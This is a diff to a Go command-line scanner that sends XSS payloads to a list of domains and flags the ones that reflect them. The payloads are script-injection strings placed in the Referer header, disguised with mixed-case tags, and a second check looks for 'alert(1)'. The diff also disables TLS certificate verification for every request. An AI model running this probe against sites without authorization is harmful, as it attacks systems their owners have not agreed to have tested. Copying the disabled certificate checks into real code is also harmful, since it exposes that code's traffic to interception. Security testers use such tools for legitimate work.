@@ -1,6 +1,7 @@
 package main
 
 import (
+	"crypto/tls"
 	"sync"
 	"bufio"
 	"net/http"
@@ -34,11 +35,18 @@ func main(){
 		go func(){
 			defer wg.Done()
 			for domain := range jobs {
-				client := &http.Client{}
+			
+				transCfg := &http.Transport{
+					TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // ignore expired SSL certificates
+				}
+			
+				client := &http.Client{
+					Transport: transCfg,
+				}
+				
 				req, err := http.NewRequest("GET", domain, nil)
-				req.Header.Add("Referer", `http://google.com/aa?x="()&%</meta>';</script><script>alert(98748)</script><!--`)
+				req.Header.Add("Referer", `https://www.google.com/search?hl=en&q=testing'"()&%<acx><ScRiPt>alert(9534)</ScRiPt>`)
 				req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0")
-				fmt.Println(req);
 				resp, err := client.Do(req)
 
 				if err != nil{
@@ -50,12 +58,13 @@ func main(){
 	      			fmt.Println(err)
 	   			}
 	   			sb := string(body)
-	   			check_result := strings.Contains(sb , "alert(98748)")
+
+	   			check_result := strings.Contains(sb , "alert(9534)")
 	   			if check_result != false {
-	   				fmt.Println(string(colorRed), "[REFERER XSS] - Vulnerable To XSS:", domain, string(colorReset))
+	   				fmt.Println(string(colorRed), "[REFERER XSS] - Vulnerable To XSS: ", domain, string(colorReset))
 	   			}else{
 					if *silent != true {
-						fmt.Println(string(colorGreen), "[REFERER XSS] - Not Vulnerable To XSS:", domain, string(colorReset))	
+						fmt.Println(string(colorGreen), "[REFERER XSS] - Not Vulnerable To XSS: ", domain, string(colorReset))	
 					}
 	   			}
 
@@ -63,7 +72,13 @@ func main(){
 				// ============================================================================================================ //
 
 
-				client2 := &http.Client{}
+				transCfg2 := &http.Transport{
+					TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // ignore expired SSL certificates
+				}
+			
+				client2 := &http.Client{
+					Transport: transCfg2,
+				}
 				req2, err2 := http.NewRequest("GET", domain, nil)
 				resp2, err2 := client2.Do(req2)
 
@@ -79,10 +94,10 @@ func main(){
 	   			sb2 := string(body2)
 	   			check_result2 := strings.Contains(sb2 , "alert(1)")
 	   			if check_result2 != false {
-	   				fmt.Println(string(colorRed), "[QUERY] - Vulnerable To XSS:", domain, string(colorReset))
+	   				fmt.Println(string(colorRed), "[QUERY] - Vulnerable To XSS: ", domain, string(colorReset))
 	   			}else{
 					if *silent != true {
-						fmt.Println(string(colorGreen), "[QUERY] - Not Vulnerable To XSS:", domain, string(colorReset))	
+						fmt.Println(string(colorGreen), "[QUERY] - Not Vulnerable To XSS: ", domain, string(colorReset))	
 					}
 	   			}
 			}
